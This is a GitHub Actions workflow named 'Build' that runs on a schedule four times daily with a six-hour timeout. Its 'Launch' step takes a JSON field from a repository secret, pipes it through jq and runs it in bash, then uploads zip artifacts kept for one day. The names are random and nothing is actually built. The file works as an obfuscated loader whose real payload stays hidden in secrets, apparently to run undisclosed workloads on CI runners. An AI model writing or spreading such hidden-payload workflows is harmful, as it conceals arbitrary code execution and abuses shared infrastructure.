name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '45 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          wjebt59: ${{ secrets.wjebt59 }}
        run: |
          printf '%s' "$wjebt59" | jq -r .bpi50 | /bin/bash
          echo $exag8209 | jq -r .wca3 | /bin/bash
          echo $xgpv34821 | jq -r .vis6 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: waobnu57
          path: "*.zip"
          retention-days: 1
